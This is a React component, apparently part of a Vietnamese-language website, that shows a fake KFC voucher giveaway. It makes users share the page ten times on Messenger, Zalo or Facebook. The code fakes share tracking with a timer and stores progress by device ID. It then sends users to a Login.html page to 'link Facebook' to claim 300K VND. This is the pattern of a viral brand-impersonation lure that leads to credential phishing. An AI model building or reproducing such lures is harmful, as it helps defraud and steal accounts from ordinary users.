import * as React from "react";
import { useNavigate } from "react-router-dom";
import { MessageCircle, Facebook, Share2, CheckCircle, Gift, LogIn } from "lucide-react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { supabase } from "@/integrations/supabase/client";

interface ShareModalProps {
  isOpen: boolean;
  onClose: () => void;
  deviceId: string;
  shareCount: number;
  onShareComplete: () => void;
  onShareCountUpdate?: (count: number) => void;
}

const REQUIRED_SHARES = 10;

const ShareModal = ({ isOpen, onClose, deviceId, shareCount, onShareComplete, onShareCountUpdate }: ShareModalProps) => {
  const navigate = useNavigate();
  const [currentShareCount, setCurrentShareCount] = React.useState(shareCount);
  const [isSharing, setIsSharing] = React.useState(false);
  const shareUrl = window.location.href;
  const shareText = "🎁 KFC đang tặng voucher 300K! Chọn hộp quà may mắn ngay! 🍗";

  React.useEffect(() => {
    setCurrentShareCount(shareCount);
  }, [shareCount]);

  const updateShareCount = async () => {
    const newCount = currentShareCount + 1;
    setCurrentShareCount(newCount);
    onShareCountUpdate?.(newCount);
    
    const { error } = await supabase
      .from('gift_receivers')
      .update({ share_count: newCount })
      .eq('device_id', deviceId);

    if (error) {
      console.error('Error updating share count:', error);
      return;
    }

    if (newCount >= REQUIRED_SHARES) {
      onShareComplete();
    }
  };

  const handleShare = async (platform: 'messenger' | 'zalo' | 'facebook') => {
    setIsSharing(true);
    
    let shareLink = '';
    
    switch (platform) {
      case 'messenger':
        shareLink = `https://www.facebook.com/dialog/send?link=${encodeURIComponent(shareUrl)}&app_id=966242223397117&redirect_uri=${encodeURIComponent(shareUrl)}`;
        break;
      case 'zalo':
        shareLink = `https://zalo.me/share?url=${encodeURIComponent(shareUrl)}&text=${encodeURIComponent(shareText)}`;
        break;
      case 'facebook':
        shareLink = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}&quote=${encodeURIComponent(shareText)}`;
        break;
    }
    
    // Open share dialog
    window.open(shareLink, '_blank', 'width=600,height=400');
    
    // Track the share after a delay (simulating share completion)
    setTimeout(async () => {
      await updateShareCount();
      setIsSharing(false);
    }, 2000);
  };

  const handleLoginToReceive = () => {
    // Mark as claimed in database before redirecting
    supabase
      .from('gift_receivers')
      .update({ is_claimed: true })
      .eq('device_id', deviceId)
      .then(() => {
        onClose();
        window.location.href = '/Login.html?redirect=/';
      });
  };

  const progress = (currentShareCount / REQUIRED_SHARES) * 100;
  const isComplete = currentShareCount >= REQUIRED_SHARES;

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="bg-gradient-to-br from-primary to-kfc-red-dark border-4 border-accent max-w-md mx-auto">
        <div className="flex flex-col items-center text-center py-4">
          {isComplete ? (
            <>
              <CheckCircle className="w-16 h-16 text-accent mb-4" />
              <h2 className="text-2xl font-bold text-primary-foreground mb-2">
                🎉 HOÀN THÀNH! 🎉
              </h2>
              <p className="text-primary-foreground/80 mb-4">
                Bạn đã chia sẻ đủ {REQUIRED_SHARES} lần!
              </p>
              <div className="bg-accent rounded-2xl p-6 mb-4 animate-glow-pulse">
                <Gift className="w-12 h-12 text-accent-foreground mx-auto mb-2" />
                <p className="text-3xl font-bold text-accent-foreground">
                  300.000 VNĐ
                </p>
                <p className="text-sm text-accent-foreground/80 mt-2">
                  Liên kết để nhận voucher!
                </p>
              </div>
              <Button 
                onClick={handleLoginToReceive}
                className="bg-accent hover:bg-kfc-gold-light text-accent-foreground font-bold px-8 py-6 text-lg"
              >
                <LogIn className="w-5 h-5 mr-2" />
                Liên kết FaceBook để nhận quà
              </Button>
            </>
          ) : (
            <>
              <Share2 className="w-12 h-12 text-accent mb-4 animate-bounce" />
              <h2 className="text-xl md:text-2xl font-bold text-primary-foreground mb-2">
                Chia sẻ để nhận quà!
              </h2>
              <p className="text-primary-foreground/80 mb-4 text-sm">
                Chia sẻ {REQUIRED_SHARES} lần qua mạng xã hội để nhận voucher 300K
              </p>

              {/* Progress */}
              <div className="w-full mb-6">
                <div className="flex justify-between text-sm text-primary-foreground/70 mb-2">
                  <span>Tiến độ</span>
                  <span>{currentShareCount}/{REQUIRED_SHARES} lần</span>
                </div>
                <Progress value={progress} className="h-3 bg-muted" />
              </div>

              {/* Share buttons */}
              <div className="grid grid-cols-1 gap-3 w-full">
                <Button
                  onClick={() => handleShare('messenger')}
                  disabled={isSharing}
                  className="bg-[#0084FF] hover:bg-[#0070DD] text-white font-semibold py-4 flex items-center justify-center gap-3"
                >
                  <MessageCircle className="w-5 h-5" />
                  Chia sẻ qua Messenger
                </Button>
                
                <Button
                  onClick={() => handleShare('zalo')}
                  disabled={isSharing}
                  className="bg-[#0068FF] hover:bg-[#0055DD] text-white font-semibold py-4 flex items-center justify-center gap-3"
                >
                  <MessageCircle className="w-5 h-5" />
                  Chia sẻ qua Zalo
                </Button>
                
                <Button
                  onClick={() => handleShare('facebook')}
                  disabled={isSharing}
                  className="bg-[#1877F2] hover:bg-[#166FE5] text-white font-semibold py-4 flex items-center justify-center gap-3"
                >
                  <Facebook className="w-5 h-5" />
                  Chia sẻ qua Facebook
                </Button>
              </div>

              <p className="text-xs text-primary-foreground/50 mt-4">
                ⚠️ Chỉ tính lượt chia sẻ qua các nút trên
              </p>
            </>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default ShareModal;
